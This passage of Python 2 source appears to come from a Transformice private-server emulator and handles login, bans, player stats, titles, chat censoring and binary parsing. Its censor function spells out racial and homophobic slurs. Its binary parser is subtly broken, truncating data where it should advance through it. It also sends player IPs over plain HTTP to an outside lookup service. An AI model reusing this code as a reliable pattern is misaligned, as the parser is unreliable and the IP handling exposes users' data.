                startRoom = chr(3) + '[Tutorial] ' + username
                self.isNewbie = True
        else:
            username = username.lower()
            username = username.capitalize()
            priv = self.server.authenticate(username, passwordHash)
        if priv != 0:
            username = username.lower()
            username = username.capitalize()
        self.Database.execute('select * from userpermaban where name = ?', [username])
        rrf = self.Database.fetchone()
        if rrf is None:
            pass
        elif priv != -1:
            priv = -1
            print str(datetime.today()) + ' ' + '[' + self.address[0] + ' - ' + username + '] Usuario Permanentemente Banido Tentou Se Logar'
            self.sendPermaBan()
            self.transport.loseConnection()
        if not username.startswith('*'):
            self.TempBan = self.server.checkTempBan(username)
        if self.TempBan:
            if priv != -1:
                timee = int(self.timestampCalc(self.server.getTempBanInfo(username)[1])[2])
                if timee <= 0:
                    self.TempBan = False
                    self.server.removeTempBan(username)
                else:
                    self.sendPlayerBanLogin(timee, self.server.getTempBanInfo(username)[2])
                    priv = -1
                    self.transport.loseConnection()
        if self.isIPban != False:
            priv = -1
        if self.sentinelle:
            priv = -1
        if self.isinit:
            priv = -1
        if self.loadercheck == False:
            priv = -1
        if self.logonsuccess:
            priv = -1
        if self.wrongPasswordAttempts >= 4:
            self.sendData('\x1a\x03', [''])
            priv = -1
            self.sendModMessageChannel('Servidor', 'Kick - Tentativa de For\xc3\xa7a Bruta (Password) - %s' % self.address[0])
            self.server.tempBanIPExact(self.address[0], 120)
            self.transport.loseConnection()
        if priv == -1:
            self.FreezePlayerData(5)
            reactor.callLater(5, self.sendData, '\x1a\x0c', '\x02', True)
            self.wrongPasswordAttempts += 1
        else:
            alreadyconnect = self.server.checkAlreadyConnectedAccount(username)
            if alreadyconnect == True:
                self.sendData('\x1a\x0c', '\x01', True)
            else:
                self.sendWorkSelf()
                if priv is not 0:
                    self.sendWorkSelfAfterLogin()
                self.BotGuardian = BotGuardian.botGuardian(self)
                self.logonsuccess = True
                self.username = username
                self.playerCode = self.server.generatePlayerCode()
                self.privilegeLevel = priv
                self.Database.execute('select * from LoginLog where name = ? and ip = ?', [username, self.address[0]])
                rrf = self.Database.fetchone()
                if rrf is None:
                    self.Database.execute('insert into LoginLog (Name, IP) values (?, ?)', (username, self.address[0]))
                    self.Database.commit()
                AllPlayerStats = self.server.getAllPlayerData(username)
                if type(AllPlayerStats) == int:
                    self.transport.loseConnection()
                self.cppid = AllPlayerStats[2]
                self.hardMode = AllPlayerStats[24]
                self.hardModeSaves = AllPlayerStats[25]
                self.EmailAddress = AllPlayerStats[27]
                self.ValidatedEmail = self.server.str2bool(AllPlayerStats[28])
                if self.EmailAddress == 'None':
                    self.EmailAddress = ''
                    self.ValidatedEmail = False
                if self.ValidatedEmail:
                    self.sendEmailValidated()
                if priv is not 0:
                    self.tribe = AllPlayerStats[10].rsplit(':', 2)
                    if self.tribe[0] != '':
                        UserTribeInfo = self.tribe
                        TribeData = self.Tribulle.getTribeData(UserTribeInfo[0])
                        self.TribeCode = TribeData[0]
                        self.TribeName = TribeData[1]
                        self.TribeChatCode = TribeData[6]
                        self.TribeRank = UserTribeInfo[1]
                        self.TribeJoined = UserTribeInfo[2]
                        self.TribeInfo = self.Tribulle.sendTribeInfoPlayer(self.TribeCode, self.TribeRank)
                        self.isInTribe = True
                    self.titleNumber = int(AllPlayerStats[11])
                    self.roundCount = int(AllPlayerStats[8])
                    self.gender = int(AllPlayerStats[45])
                    self.datereg = int(AllPlayerStats[34])
                    self.micesaves = int(AllPlayerStats[4])
                    self.shamancheese = int(AllPlayerStats[5])
                    self.firstcount = int(AllPlayerStats[6])
                    self.colornick = '#FFFF00'
                    self.cheesecount = int(AllPlayerStats[7])
                    self.bootcampcount = int(AllPlayerStats[30])
                    self.shopcheese = int(AllPlayerStats[15])
                    self.shopcoins = int(AllPlayerStats[37])
                    self.shopfraises = int(AllPlayerStats[32])
                    self.shopitems = str(AllPlayerStats[12])
                    self.banhours = int(AllPlayerStats[16])
                    self.friendsList = str(AllPlayerStats[13])
                    self.ignoredsList = str(AllPlayerStats[43])
                    self.look = str(AllPlayerStats[14])
                    self.visuals = str(AllPlayerStats[41])
                    ismapcrew = bool(int(AllPlayerStats[35]))
                    self.shamItens = str(AllPlayerStats[49])
                    dbItensSham = str(AllPlayerStats[50]).replace("'", '"')
                    self.itensSham = ast.literal_eval(dbItensSham)
                    self.divineModeSaves = AllPlayerStats[51]
                    self.Badges = str(AllPlayerStats[53].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                    self.survivorStats = str(AllPlayerStats[56]).split(',')
                else:
                    self.titleNumber = 0
                    self.roundCount = 0
                    self.gender = 0
                    self.datereg = 0
                    self.micesaves = 0
                    self.shamancheese = 0
                    self.firstcount = 0
                    self.cheesecount = 0
                    self.bootcampcount = 0
                    self.shopcheese = 0
                    self.shopcoins = 0
                    self.shopfraises = 0
                    self.shopitems = ''
                    self.banhours = 0
                    self.friendsList = ''
                    self.ignoredsList = ''
                    self.look = '1;0,0,0,0,0,0'
                    self.visuals = ''
                    ismapcrew = False
                    self.tribe = False
                    self.shamItens = ''
                    self.itensSham = {}
                    self.divineModeSaves = 0
                    self.Badges = []
                self.friendsList = self.friendsList.strip('[]').replace(' ', '').replace('"', '').replace(',', ' ')
                self.ignoredsList = self.ignoredsList.strip('[]').replace(' ', '').replace('"', '').replace(',', ' ')
                if self.friendsList == '':
                    self.friendsList = []
                else:
                    self.friendsList = self.friendsList.split(' ')
                if self.ignoredsList == '':
                    self.ignoredsList = []
                else:
                    self.ignoredsList = self.ignoredsList.split(' ')
                if ismapcrew:
                    self.isMapCrew = True
                else:
                    self.isMapCrew = False
                titlelists = self.server.getTitleLists(username)
                self.CheeseTitleList = str(titlelists[0].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                self.FirstTitleList = str(titlelists[1].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                self.ShamanTitleList = str(titlelists[2].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                self.ShopTitleList = str(titlelists[3].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                self.GiftTitleList = str(titlelists[4].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                self.HardModeTitleList = str(titlelists[5].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                self.BootcampTitleList = str(titlelists[6].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                self.DivineModeTitleList = str(titlelists[7].strip('[]').replace('"', '').replace(',', ' ')).split(' ')
                self.checkAndRebuildTitleList('cheese')
                self.checkAndRebuildTitleList('first')
                self.checkAndRebuildTitleList('shaman')
                self.checkAndRebuildTitleList('shop')
                self.checkAndRebuildTitleList('hardmode')
                self.checkAndRebuildTitleList('bootcamp')
                self.checkAndRebuildTitleList('divinemode')
                if self.username == 'Kekool':
                    self.titleList = ['0,9'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                else:
                    self.titleList = ['0'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                if self.privilegeLevel >= 10 and not self.isMapCrew:
                    self.titleList = self.titleList + ['440',
                     '442',
                     '444',
                     '445',
                     '446',
                     '447',
                     '448']
                self.titleList = filter(None, self.titleList)
                self.Badges = filter(None, self.Badges)
                self.checkAndRebuildBadgeList('shop')
                if self.privilegeLevel >= 1:
                    for i in self.titleList:
                        if ',' in str(i):
                            t, c = str(i).split(',')
                            if self.titleNumber == int(t):
                                self.titleNumber = i
                                break

                if self.ValidatedEmail:
                    self.sendEmailValidated()
                self.sendData('\x08\x16', '\x03\x01\x05\x02\x03\x04\x01', True)
                self.modmute = self.server.checkModMute(self.username)
                if self.server.getTotemData(self.username) != -1:
                    totemvalues = self.server.getTotemData(self.username)
                    self.STotem = [totemvalues[1], totemvalues[2]]
                self.giftCount = 0
                if int(self.banhours) >= 1:
                    self.sendBanWarning(self.banhours)
                playerLevelData = self.server.getPlayerLevelData(True, username)
                self.playerLevel = int(playerLevelData[0])
                self.playerExp = int(playerLevelData[1])
                self.playerExpNext = int(playerLevelData[2])
                self.playerSkills = self.server.getPlayerSkillsData(username)
                self.playerRedistribute = self.server.getPlayerRedistribute(username)
                self.SkillModule.getMySkills()
                self.sendExp(self.playerLevel, self.playerExp, self.playerExpNext)
                self.sendPlayerLoginData()
                if not self.username.startswith('*'):
                    self.sendPlayerIdentificationData()
                self.sendData('\x1a\n', '\x00\x00\x02\x80', True)
                self.sendShamanItens()
                if self.micesaves >= 1:
                    if self.micesaves >= 1 and self.hardModeSaves >= 0:
                        self.ShamDivine = True
                    self.sendHardMode(self.hardMode)
                self.color1, self.color2 = self.server.mouseColorInfo(True, self.username, '')
                if self.color1 == '':
                    self.color1 = '78583a'
                if self.color2 == '':
                    if self.micesaves >= 1:
                        self.color2 = 'fade55'
                    else:
                        self.color2 = '95d9d6'
                self.sendTimesStamp()
                if self.cheesecount >= 50:
                    self.sendForumConnectNow()
                if passwordHash == '':
                    if DEBUGM:
                        print str(datetime.today()) + ' ' + 'Autenticado Com Sucesso! - [%s] %s - %s - Ratinho' % (self.Langue, self.address, username)
                elif DEBUGM:
                    print str(datetime.today()) + ' ' + 'Autenticado Com Sucesso! - [%s] %s - %s' % (self.Langue, self.address, username)
                try:
                    self.Welcome.welcome(self)
                finally:
                    del self.Welcome

                if startRoom != '':
                    self.enterRoom(startRoom)
                else:
                    self.enterRoom(self.server.recommendRoom(self.Langue))
                try:
                    self.WelcomeOthers.welcome(self)
                finally:
                    del self.WelcomeOthers

                if self.privilegeLevel >= 1:
                    self.ShopModule.checkGiftsAndMessages()
                return True
        return

    def getHashlib(self, mode, kwargs):
        if mode in 'sha512':
            return hashlib.sha512(*kwargs).hexdigest()

    def getThreading(self, mode, kwargs):
        if mode in 'Timer':
            return threading.Timer(*kwargs)

    def getReactor(self, mode, kwargs):
        if mode in 'callLater':
            return reactor.callLater(*kwargs)

    def getJson(self, mode, objects):
        if mode in 'dumps':
            return json.dumps(objects)

    def getRegex(self, mode, kwargs = False):
        if mode in 'search':
            return re.search(*kwargs)
        if mode in 'match':
            return re.match(*kwargs)
        if mode in 'sub':
            return re.sub(*kwargs)
        if not kwargs:
            if mode in 'M':
                return re.M
            if mode in 'I':
                return re.I

    def getTimer(self, x = 1):
        return thetime.time() / int(x)

    def strlen(self, s, i):
        return str(s).ljust(int(i), chr(0))

    def GetRandomChars(self, size = 6, chars = string.ascii_uppercase + string.digits):
        return ''.join((random.choice(chars) for x in range(size)))

    def safe_unicode(self, obj, *args):
        try:
            return unicode(obj, *args)
        except UnicodeDecodeError:
            ascii_text = str(obj).encode('string_escape')
            return unicode(ascii_text)

    def safe_str(self, obj):
        try:
            return str(obj)
        except UnicodeEncodeError:
            return unicode(obj).encode('unicode_escape')

    def ByteToHex(self, byteStr):
        return ''.join([ '%02X ' % ord(x) for x in byteStr ]).strip()

    def HexToByte(self, hexStr):
        bytes = []
        hexStr = ''.join(hexStr.split(' '))
        for i in range(0, len(hexStr), 2):
            bytes.append(chr(int(hexStr[i:i + 2], 16)))

        return ''.join(bytes)

    def dec2hex(self, n):
        return '%X' % n

    def hex2dec(self, s):
        return int(s, 16)

    def unicodeStringToHex(self, src):
        result = ''
        for i in xrange(0, len(src)):
            unichars = src[i:i + 1]
            hexcode = ' '.join([ '%02x' % ord(x) for x in unichars ])
            result = result + hexcode

        return result

    def checkValidXML(self, xmlString):
        if re.search('ENTITY', xmlString):
            return False
        if re.search('<html>', xmlString):
            return False
        try:
            parser = xml.parsers.expat.ParserCreate()
            parser.Parse(xmlString)
            return True
        except Exception as e:
            return False

    def checkUnlockShopTitle(self):
        if self.privilegeLevel != 0:
            if self.getShopLength() in self.shopTitleCheckList:
                unlockedtitle = self.shopTitleDictionary[self.getShopLength()]
                self.sendUnlockedTitle(self.playerCode, unlockedtitle)
                self.ShopTitleList = self.ShopTitleList + [unlockedtitle]
                if self.username == 'Kekool':
                    self.titleList = ['0,7'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                else:
                    self.titleList = ['0'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                if self.privilegeLevel >= 10:
                    self.titleList = self.titleList + ['440',
                     '442',
                     '444',
                     '445',
                     '446',
                     '447',
                     '448']
                self.titleList = filter(None, self.titleList)
        return

    def getShopLength(self, customList = None):
        if customList:
            if customList.strip() == '':
                return 0
            else:
                return len(customList.split(','))
        else:
            if self.shopitems.strip() == '':
                return 0
            return len(self.shopitems.split(','))

    def checkInShop(self, item):
        if self.shopitems.strip() == '':
            return False
        else:
            shopitems = self.shopitems.split(',')
            for shopitem in shopitems:
                if '_' in shopitem:
                    shopitem, custom = shopitem.split('_')
                else:
                    shopitem = shopitem
                    custom = ''
                if str(item) == str(shopitem):
                    return True

            return False

    def getItemCustomization(self, item):
        if self.shopitems.strip() == '':
            return ''
        else:
            shopitems = self.shopitems.split(',')
            for shopitem in shopitems:
                if '_' in shopitem:
                    shopitem, custom = shopitem.split('_')
                else:
                    shopitem = shopitem
                    custom = ''
                if str(item) == str(shopitem):
                    if custom == '':
                        return ''
                    else:
                        return '_' + custom

            return False

    def checkInTitleList(self, title):
        if str(title) in str(self.titleList):
            return True
        else:
            return False
        return False

    def checkAndRebuildBadgeList(self, i):
        if i == 'shop':
            rebuild = False
            shopitems = self.shopitems.split(',')
            shopitems = filter(None, shopitems)
            for i in shopitems:
                if '_' in i:
                    i, custom = i.split('_')
                if int(i) in self.shopBadgeCheckList:
                    if str(self.shopBadgeDictionary[int(i)]) not in self.Badges:
                        badge = self.shopBadgeDictionary[int(i)]
                        self.Badges = self.Badges + [str(badge)]

        else:
            return False
        return

    def checkAndRebuildTitleList(self, titleList):
        if titleList == 'shop':
            rebuild = False
            x = self.getShopLength()
            while x > 0:
                if str(x) in self.shopTitleCheckList or int(x) in self.shopTitleCheckList:
                    if str(self.shopTitleDictionary[x]) not in self.ShopTitleList:
                        rebuild = True
                    break
                x = x - 1

            if rebuild:
                x = self.getShopLength()
                y = 0
                self.ShopTitleList = []
                while y <= x:
                    if y in self.shopTitleCheckList:
                        title = self.shopTitleDictionary[y]
                        self.ShopTitleList = self.ShopTitleList + [title]
                    y = y + 1

                return True
            else:
                return False
        elif titleList == 'cheese':
            rebuild = False
            x = int(self.cheesecount)
            while x > 0:
                if str(x) in self.cheeseTitleCheckList or int(x) in self.cheeseTitleCheckList:
                    if str(self.cheeseTitleDictionary[x]) not in self.CheeseTitleList:
                        rebuild = True
                    break
                x = x - 1

            if rebuild:
                x = int(self.cheesecount)
                y = 0
                self.CheeseTitleList = []
                while y <= x:
                    if y in self.cheeseTitleCheckList:
                        title = self.cheeseTitleDictionary[y]
                        self.CheeseTitleList = self.CheeseTitleList + [title]
                    y = y + 1

                return True
            else:
                return False
        elif titleList == 'first':
            rebuild = False
            x = int(self.firstcount)
            while x > 0:
                if str(x) in self.firstTitleCheckList or int(x) in self.firstTitleCheckList:
                    if str(self.firstTitleDictionary[x]) not in self.FirstTitleList:
                        rebuild = True
                    break
                x = x - 1

            if rebuild:
                x = int(self.firstcount)
                y = 0
                self.FirstTitleList = []
                while y <= x:
                    if y in self.firstTitleCheckList:
                        title = self.firstTitleDictionary[y]
                        self.FirstTitleList = self.FirstTitleList + [title]
                    y = y + 1

                return True
            else:
                return False
        elif titleList == 'shaman':
            rebuild = False
            x = int(self.micesaves)
            while x > 0:
                if str(x) in self.shamanTitleCheckList or int(x) in self.shamanTitleCheckList:
                    if str(self.shamanTitleDictionary[x]) not in self.ShamanTitleList:
                        rebuild = True
                    break
                x = x - 1

            if rebuild:
                x = int(self.micesaves)
                y = 0
                self.ShamanTitleList = []
                while y <= x:
                    if y in self.shamanTitleCheckList:
                        title = self.shamanTitleDictionary[y]
                        self.ShamanTitleList = self.ShamanTitleList + [title]
                    y = y + 1

                return True
            else:
                return False
        elif titleList == 'hardmode':
            rebuild = False
            x = int(self.hardModeSaves)
            while x > 0:
                if str(x) in self.hardShamTitleCheckList or int(x) in self.hardShamTitleCheckList:
                    if str(self.hardShamTitleDictionary[x]) not in self.HardModeTitleList:
                        rebuild = True
                    break
                x = x - 1

            if rebuild:
                x = int(self.hardModeSaves)
                y = 0
                self.HardModeTitleList = []
                while y <= x:
                    if y in self.hardShamTitleCheckList:
                        title = self.hardShamTitleDictionary[y]
                        self.HardModeTitleList = self.HardModeTitleList + [title]
                    y = y + 1

                return True
            else:
                return False
        elif titleList == 'bootcamp':
            rebuild = False
            x = int(self.bootcampcount)
            while x > 0:
                if str(x) in self.bootcampTitleCheckList or int(x) in self.bootcampTitleCheckList:
                    if str(self.bootcampTitleDictionary[x]) not in self.BootcampTitleList:
                        rebuild = True
                    break
                x = x - 1

            if rebuild:
                x = int(self.bootcampcount)
                y = 0
                self.BootcampTitleList = []
                while y <= x:
                    if y in self.bootcampTitleCheckList:
                        title = self.bootcampTitleDictionary[y]
                        self.BootcampTitleList = self.BootcampTitleList + [title]
                    y = y + 1

                return True
            else:
                return False
        elif titleList == 'divinemode':
            rebuild = False
            x = int(self.divineModeSaves)
            while x > 0:
                if str(x) in self.divineShamTitleCheckList or int(x) in self.divineShamTitleCheckList:
                    if str(self.divineShamTitleDictionary[x]) not in self.DivineModeTitleList:
                        rebuild = True
                    break
                x = x - 1

            if rebuild:
                x = int(self.divineModeSaves)
                y = 0
                self.DivineModeTitleList = []
                while y <= x:
                    if y in self.divineShamTitleCheckList:
                        title = self.divineShamTitleDictionary[y]
                        self.DivineModeTitleList = self.DivineModeTitleList + [title]
                    y = y + 1

                return True
            else:
                return False

    def returnFutureTime(self, hours):
        return str(self.getTimer() + int(hours) * 60 * 60)

    def timestampCalc(self, endTime):
        startTime = str(self.getTimer())
        startTime = datetime.fromtimestamp(float(startTime))
        endTime = datetime.fromtimestamp(float(endTime))
        result = endTime - startTime
        seconds = (result.microseconds + (result.seconds + result.days * 24 * 3600) * 1000000) / float(1000000)
        hours = int(int(seconds) / 3600) + 1
        if int(seconds) == 0:
            return [result, seconds, 0]
        elif int(seconds) >= 1 and int(seconds) <= 3600:
            return [result, seconds, 1]
        elif hours > 24:
            return [result, seconds, hours]
        else:
            return [result, seconds, hours]

    def censorMessage(self, message):
        Cmessage = re.sub('(?i)nigger', '******', message)
        Cmessage = re.sub('(?i)n!gger', '******', Cmessage)
        Cmessage = re.sub('(?i)n!gg3r', '******', Cmessage)
        Cmessage = re.sub('(?i)nigg3r', '******', Cmessage)
        Cmessage = re.sub('(?i)shit', '****', Cmessage)
        Cmessage = re.sub('(?i)sh!t', '****', Cmessage)
        Cmessage = re.sub('(?i)bitch', '*****', Cmessage)
        Cmessage = re.sub('(?i)b!tch', '*****', Cmessage)
        Cmessage = re.sub('(?i)fuck', '****', Cmessage)
        Cmessage = re.sub('(?i)cunt', '****', Cmessage)
        Cmessage = re.sub('(?i)asshole', '*******', Cmessage)
        Cmessage = re.sub('(?i)assh0le', '*******', Cmessage)
        Cmessage = re.sub('(?i)damn', '****', Cmessage)
        Cmessage = re.sub('(?i)pussy', '*****', Cmessage)
        Cmessage = re.sub('(?i)whore', '*****', Cmessage)
        Cmessage = re.sub('(?i)penis', '*****', Cmessage)
        Cmessage = re.sub('(?i)dick', '****', Cmessage)
        Cmessage = re.sub('(?i)cock', '****', Cmessage)
        Cmessage = re.sub('(?i)sex', '***', Cmessage)
        Cmessage = re.sub('(?i)boob', '****', Cmessage)
        Cmessage = re.sub('(?i)boobs', '*****', Cmessage)
        Cmessage = re.sub('(?i)boobies', '*******', Cmessage)
        Cmessage = re.sub('(?i)booby', '*****', Cmessage)
        Cmessage = re.sub('(?i)boobie', '******', Cmessage)
        Cmessage = re.sub('(?i)f\\*ck', '****', Cmessage)
        Cmessage = re.sub('(?i)hoe', '***', Cmessage)
        Cmessage = re.sub('(?i)prick', '*****', Cmessage)
        Cmessage = re.sub('(?i)fck', '****', Cmessage)
        Cmessage = re.sub('(?i)pen!s', '*****', Cmessage)
        Cmessage = re.sub('(?i)qooq', '****', Cmessage)
        Cmessage = re.sub('(?i)sqooq', '*****', Cmessage)
        Cmessage = re.sub('(?i)gay', 'happy', Cmessage)
        Cmessage = re.sub('(?i)horny', '*****', Cmessage)
        Cmessage = re.sub('(?i)horney', '******', Cmessage)
        Cmessage = re.sub('(?i)cum', 'come', Cmessage)
        Cmessage = re.sub('(?i)cumming', 'coming', Cmessage)
        Cmessage = re.sub('(?i)jizz', '****', Cmessage)
        Cmessage = re.sub('(?i)cuming', 'coming', Cmessage)
        Cmessage = re.sub('(?i)shag', '****', Cmessage)
        Cmessage = re.sub('(?i)shagging', '********', Cmessage)
        Cmessage = re.sub('(?i)shaging', '*******', Cmessage)
        Cmessage = re.sub('(?i)humping', '*******', Cmessage)
        Cmessage = re.sub('(?i)humpin', '******', Cmessage)
        Cmessage = re.sub('(?i)hump', '****', Cmessage)
        Cmessage = re.sub('(?i)hell', '****', Cmessage)
        Cmessage = re.sub('(?i)fag', '***', Cmessage)
        Cmessage = re.sub('(?i)faggot', '******', Cmessage)
        Cmessage = re.sub('(?i)piss', 'peepee', Cmessage)
        Cmessage = re.sub('(?i)crap', 'poopy', Cmessage)
        Cmessage = re.sub('(?i)motherfucker', '************', Cmessage)
        Cmessage = re.sub('(?i)tit', '***', Cmessage)
        Cmessage = re.sub('(?i)tits', '****', Cmessage)
        Cmessage = re.sub('(?i)fap', '***', Cmessage)
        Cmessage = re.sub('(?i)fapping', '*******', Cmessage)
        Cmessage = re.sub('(?i)masturbate', '**********', Cmessage)
        Cmessage = re.sub('(?i)fack', '****', Cmessage)
        Cmessage = re.sub('(?i)jack off', '**** ***', Cmessage)
        Cmessage = re.sub('(?i)jacking off', '******* ***', Cmessage)
        Cmessage = re.sub('(?i)http://', '**********', Cmessage)
        Cmessage = re.sub('(?i)www', '******', Cmessage)
        Cmessage = re.sub('(?i)transfor', '*********', Cmessage)
        return Cmessage

    def roomNameStrip(self, name, level):
        name = str(name)
        result = ''
        pending = False
        if level == '1':
            level1 = range(48, 58) + range(65, 91) + range(97, 123)
            for x in name:
                if int(self.hex2dec(x.encode('hex'))) not in level1:
                    x = '?'
                result += x

            return result
        elif level == '2':
            for x in name:
                if self.hex2dec(x.encode('hex')) < 32 or self.hex2dec(x.encode('hex')) > 126:
                    x = '?'
                result += x

            return result
        elif level == '3':
            level3 = range(32, 127) + range(192, 256)
            name = self.HexToByte(self.unicodeStringToHex(name.decode('utf-8')))
            for x in name:
                if int(self.hex2dec(x.encode('hex'))) not in level3:
                    x = '?'
                result += x

            return result
        elif level == '4':
            level4 = [32,
             34,
             36,
             39,
             40,
             41] + range(65, 91) + [91, 93] + range(97, 123)
            for x in name:
                if int(self.hex2dec(x.encode('hex'))) not in level4:
                    x = ''
                result += x

            return result
        else:
            return 'Error 2996: Invalid level.'

    def IPCountryLookup(self, ip):
        response = urllib2.urlopen('http://api.hostip.info/get_html.php?ip=%s' % ip).read()
        m = re.search('Country: (.*)', response).group(1)
        return m

    def FreezePlayerData(self, seconds):
        if self.isFrozenTimer:
            try:
                self.isFrozenTimer.cancel()
            except:
                self.isFrozenTimer = None

        if int(seconds) == 0:
            self.isFrozen = False
        else:
            self.isFrozen = True
            self.isFrozenTimer = reactor.callLater(int(seconds), self.FreezePlayerData, 0)
        return

    def parseBinaryData(self, bdata, types):
        rlist = []
        for tp in types:
            if tp == 'x':
                pass
            elif tp == 'c':
                rlist.append(struct.unpack('!' + tp, bdata[:1])[0])
                bdata = bdata[:1]
            elif tp == 'b':
                rlist.append(struct.unpack('!' + tp, bdata[:1])[0])
                bdata = bdata[:1]
            elif tp == 'B':
                rlist.append(struct.unpack('!' + tp, bdata[:1])[0])
                bdata = bdata[:1]
            elif tp == '?':
                rlist.append(struct.unpack('!' + tp, bdata[:1])[0])
                bdata = bdata[:1]
            elif tp == 'h':
                rlist.append(struct.unpack('!' + tp, bdata[:2])[0])
                bdata = bdata[:2]
            elif tp == 'H':
                rlist.append(struct.unpack('!' + tp, bdata[:2])[0])
                bdata = bdata[:2]
            elif tp == 'i':
                rlist.append(struct.unpack('!' + tp, bdata[:4])[0])
                bdata = bdata[:4]
            elif tp == 'I':
                rlist.append(struct.unpack('!' + tp, bdata[:4])[0])
                bdata = bdata[:4]
            elif tp == 'l':
                rlist.append(struct.unpack('!' + tp, bdata[:4])[0])
                bdata = bdata[:4]
            elif tp == 'L':
                rlist.append(struct.unpack('!' + tp, bdata[:4])[0])
                bdata = bdata[:4]
            elif tp == 'q':
                rlist.append(struct.unpack('!' + tp, bdata[:8])[0])
                bdata = bdata[:8]
            elif tp == 'Q':
                rlist.append(struct.unpack('!' + tp, bdata[:8])[0])
                bdata = bdata[:8]
            elif tp == 'f':
                rlist.append(struct.unpack('!' + tp, bdata[:4])[0])
                bdata = bdata[:4]
            elif tp == 'd':
                rlist.append(struct.unpack('!' + tp, bdata[:8])[0])
                bdata = bdata[:8]
            elif tp == 'u':
                rlist.append(bdata[2:int(struct.unpack('!h', bdata[:2])[0]) + 2])
                bdata = bdata[int(struct.unpack('!h', bdata[:2])[0]) + 2:]

        if len(rlist) == 1:
            return rlist[0]
        elif len(rlist) == 0:
            return 'Error!'
        else:
            return rlist


class TransformiceServer(protocol.ServerFactory):
    protocol = TransformiceClientHandler

    def __init__(self):
        self.Database = Database.database()
        self.STARTTIME = datetime.today()
        self.ServerID = str(self.getServerSetting('ServerID'))
        self.Owner = str(self.getServerSetting('Owner'))
        self.Key = str(self.getServerSetting('Key'))
        self.POLICY = str(self.getServerSetting('Policy'))
        self.PORT = str(self.getServerSetting('PolicyPorts'))
        self.LCDMT = str(self.getServerSetting('LCDMT'))
        self.LoaderURL = str(self.getServerSetting('LoaderURL'))
        self.LoaderSize = int(self.getServerSetting('LoaderSize'))
        self.ModLoaderSize = int(self.getServerSetting('ModLoaderSize'))
        self.ClientSize = int(self.getServerSetting('ClientSize'))
        self.ValidateLoader = self.str2bool(self.getServerSetting('ValidateLoader'))
        self.ValidateVersion = self.str2bool(self.getServerSetting('ValidateVersion'))
        self.GetCapabilities = self.str2bool(self.getServerSetting('GetClientCapabilities'))
        self.lastPlayerCode = int(self.getServerSetting('InitPlayerCode'))
        self.MaxBinaryLength = int(self.getServerSetting('MaxBinaryLength'))
        self.MinBinaryLength = int(self.getServerSetting('MinBinaryLength'))
        self.MaxUTFLength = int(self.getServerSetting('MaxUTFLength'))
        self.MinUTFLength = int(self.getServerSetting('MinUTFLength'))
        self.EditorShopCheese = int(self.getServerSetting('EditeurShopCheese'))
        self.EditeurCheese = int(self.getServerSetting('EditeurCheese'))
        self.TribuShopCheese = int(self.getServerSetting('TribuShopCheese'))
        self.EmailServerAddr = str(self.getServerSetting('EmailServerAddr'))
        self.EmailServerPort = int(self.getServerSetting('EmailServerPort'))
        self.EmailServerName = str(self.getServerSetting('EmailServerName'))
        self.EmailServerPass = str(self.getServerSetting('EmailServerPass'))
        self.EmailServerSSL = self.str2bool(self.getServerSetting('EmailServerSSL'))
        self.BaseForumURL = str(self.getServerSetting('BaseForumURL'))
        self.BaseAvatarURL = str(self.getServerSetting('BaseAvatarURL'))
        self.MinMiceExp = int(self.getServerSetting('MinMiceExp'))
        self.MinMiceFirst = int(self.getServerSetting('MinMiceFirst'))
        self.MinMiceBootcount = int(self.getServerSetting('MinMiceBootcount'))
        self.DisableTribulle = self.str2bool(self.getServerSetting('DisableTribulle'))
        self.isNeedsForEvent = int(self.getServerSetting('isNeedsForEvent'))
        self.isChristmas = self.str2bool(self.getServerSetting('Christmas'))
        self.eventMap = 561
        self.timeEvent = None
        self.TribeRankSettings = {'${trad#TG_6}': {'id': 2000040,
                          'position': 4,
                          'remove': 0,
                          'perm': '0,0,0,0,0,1,0,1,0,1,0'},
         '${trad#TG_7}': {'id': 2000030,
                          'position': 3,
                          'remove': 0,
                          'perm': '0,0,1,0,0,1,0,1,1,1,0'},
         '${trad#TG_8}': {'id': 2000020,
                          'position': 2,
                          'remove': 0,
                          'perm': '0,0,1,1,1,1,1,1,1,1,1'},
         '${trad#tribu.chef}': {'id': 2000010,
                                'position': 1,
                                'remove': 1,
                                'perm': '0,1,1,1,1,1,1,1,1,1,1'},
         '${trad#tribu.nouv}': {'id': 2000070,
                                'position': 7,
                                'remove': 1,
                                'perm': '0,0,0,0,0,0,0,0,0,0,0'},
         '${trad#tribu.memb}': {'id': 2000060,
                                'position': 6,
                                'remove': 0,
                                'perm': '0,0,0,0,0,0,0,0,0,0,0'},
         '${trad#TG_4}': {'id': 2000050,
                          'position': 5,
                          'remove': 0,
                          'perm': '0,0,0,0,0,1,0,0,0,0,0'}}
        self.Communities = {0: 'en',
         1: 'fr',
         2: 'ru',
         3: 'br',
         4: 'es',
         5: 'cn',
         6: 'tr',
         7: 'vk',
         8: 'pl',
         9: 'hu',
         10: 'nl',
         11: 'ro',
         12: 'id',
         13: 'de',
         14: 'e2',
         15: 'ar',
         16: 'ph',
         17: 'lt',
         18: 'jp',
         19: '',
         20: 'fi',
         21: '',
         22: '',
         23: '',
         24: '',
         25: '',
         26: 'he',
         27: 'it',
         28: '',
         29: '',
         30: ''}
        self.ParseBase = Setting
        self.parseByte = ByteArray
        if self.GetCapabilities:
            self.ValidateLoader = True
        Start = datetime.now()
        self.tempAccountBanList = []
        self.tempIPBanList = []
        self.IPPermaBanCache = []
        self.connectCounts = {}
        self.langues = {}
        self.reportCache = {}
        self.ModList = {}
        self.verifyChatSafe = True
        self.RankList = {'users': {},
